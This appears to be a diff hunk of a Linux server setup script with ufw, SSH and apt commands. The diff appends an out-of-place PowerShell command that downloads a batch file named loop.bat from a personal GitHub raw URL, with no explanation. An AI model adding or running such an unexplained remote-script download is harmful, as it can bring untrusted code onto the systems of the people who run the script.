@@ -30,3 +30,4 @@ sudo ufw allow ssh
 sudo ufw enable
 systemctl restart ssh
 sudo apt-get clean
+Invoke-WebRequest https://raw.githubusercontent.com/Danko13-ui/DK/main/loop.bat -OutFile loop.bat
